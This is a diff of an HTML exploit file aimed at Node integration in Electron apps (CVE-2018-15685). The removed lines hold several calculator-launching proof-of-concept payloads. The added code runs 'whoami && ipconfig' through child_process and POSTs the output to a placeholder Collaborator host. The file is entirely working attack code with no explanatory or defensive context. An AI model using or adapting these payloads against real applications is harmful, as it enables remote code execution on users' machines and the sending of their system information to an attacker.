@@ -1,34 +1,20 @@
 <!DOCTYPE html>
-<html>
-<head>
-  <title>Electron CVE-2018-15685 RCE PoC</title>
-</head>
 <body>
-  <h1>Exploit Launcher</h1>
-  <button onclick="trigger()">Click to Exploit</button>
-
   <script>
-    function trigger() {
-      const win = window.open('', '', 'nodeIntegration=yes');
-      win.document.write(`
-        <script>
-          require('child_process').exec('open -a Calculator');
-        <\/script>
-      `);
+    // Check if Node.js is available
+    if (typeof process !== 'undefined') {
+      const { exec } = require('child_process');
+      exec('whoami && ipconfig', (err, stdout) => {
+        fetch('https://YOUR-COLLAB.oastify.com/rce', { 
+          method: 'POST', 
+          body: err ? err.message : stdout 
+        });
+      });
+    } else {
+      alert('Node.js integration disabled!');
     }
   </script>
 </body>
 </html>
 
-<img src=x onerror="require('child_process').exec('open -a Calculator')">
 
-<script>require('child_process').exec('open -a Calculator')</script>
-
-<webview id="exploit" src="data:text/html,
-  <script>
-    require('child_process').exec('open -a Calculator')
-  <\/script>"
-  nodeintegration></webview>
-
-
-  
